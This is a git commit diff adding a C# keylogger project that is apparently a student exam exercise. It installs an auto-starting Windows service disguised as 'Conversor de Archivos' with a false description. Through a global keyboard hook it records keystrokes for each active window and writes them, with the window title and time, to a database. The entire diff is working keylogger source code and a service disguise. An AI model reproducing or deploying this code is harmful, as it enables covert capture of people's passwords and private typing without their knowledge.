706a0b0fdce166fff2129e595f4595ab3bf68049
mahpa94 <mahpatlv94@gmail.com>
2018-02-04 13:53:22 -0500

    Key Logger

---
+++ KeyLoggerExample/Program.cs
@@ -0,0 +1,40 @@
+﻿using Keystroke.API;
+using Keystroke.API.CallbackObjects;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Topshelf;
+
+namespace KeyLoggerExample
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Install-Package KeystrokeAPI
+            // Añadir Referencia de System.Windows.Forms 
+            HostFactory.Run(configuracionDelServicio =>
+            {
+                configuracionDelServicio.UseNLog();
+                configuracionDelServicio.Service<ServicioKeyLogger>
+                (
+                    instanciaDelServicio =>
+                    {
+                        instanciaDelServicio.ConstructUsing(() => new ServicioKeyLogger());
+                        instanciaDelServicio.WhenStarted(servicioEnEjecucion => servicioEnEjecucion.Comenzar());
+                        instanciaDelServicio.WhenStopped(servicioEnEjecucion => servicioEnEjecucion.Detenerse());
+                    }
+                );
+                configuracionDelServicio.StartAutomatically();
+                configuracionDelServicio.SetDisplayName("Conversor de Archivos");
+                configuracionDelServicio.SetDescription("Convierte los archivos en la carpeta temporal a mayusculas");
+                configuracionDelServicio.SetServiceName("ConversorDeArchivos");
+            });
+        }
+
+        
+    }
+}
---
+++ KeyLoggerExample/ServicioKeyLogger.cs
@@ -0,0 +1,82 @@
+﻿using Keystroke.API;
+using Keystroke.API.CallbackObjects;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Topshelf.Logging;
+
+namespace KeyLoggerExample
+{
+    public class ServicioKeyLogger
+    {
+        private static readonly LogWriter log = HostLogger.Get<ServicioKeyLogger>();
+        static Dictionary<string, string> characterBuffer = new Dictionary<string, string>();
+
+        public bool Comenzar()
+        {
+            using (var api = new KeystrokeAPI())
+            {
+                api.CreateKeyboardHook((character) => { proccessKey(character); });
+                Application.Run();
+            }
+            return true;
+        } 
+
+        private static void proccessKey(KeyPressed keyPressed)
+        {
+            string ventanaActual = keyPressed.CurrentWindow;
+            string bufferDeTeclasTipeadas = characterBuffer.ContainsKey(ventanaActual) ? characterBuffer[ventanaActual] : null;
+            if (KeyCode.Return == keyPressed.KeyCode)
+            {
+                if (bufferDeTeclasTipeadas != null)
+                {
+                    Console.WriteLine(ventanaActual + " : " + bufferDeTeclasTipeadas);
+                    ServicioKeyLogger.AddDatabaseLog(ventanaActual, bufferDeTeclasTipeadas);
+                    //log.InfoFormat(ventanaActual + " : " + bufferDeTeclasTipeadas);
+
+                    characterBuffer[ventanaActual] = null;
+                }
+            }
+            else
+            {
+                if (bufferDeTeclasTipeadas != null)
+                {
+                    characterBuffer[ventanaActual] = bufferDeTeclasTipeadas + keyPressed;
+                }
+                else
+                {
+                    characterBuffer[ventanaActual] = "" + keyPressed;
+                }
+            }
+        }
+
+        private static void AddDatabaseLog(string ventanaActual, string bufferDeTeclasTipeadas)
+        {
+            try
+            {
+                DBExamenFinalEntities1 db = new DBExamenFinalEntities1();
+                LogKeyLogger log = new LogKeyLogger();
+                log.Cadena = bufferDeTeclasTipeadas;
+                log.Programa = ventanaActual;
+                log.Hora = DateTime.Now;
+
+                db.LogKeyLogger.Add(log);
+                db.SaveChanges();
+            }
+            catch(Exception ex)
+            {
+                log.InfoFormat(ex.ToString());
+            }
+            
+        }
+
+        public bool Detenerse()
+        {
+            Application.Exit();
+            return true;
+        }
+    }
+}
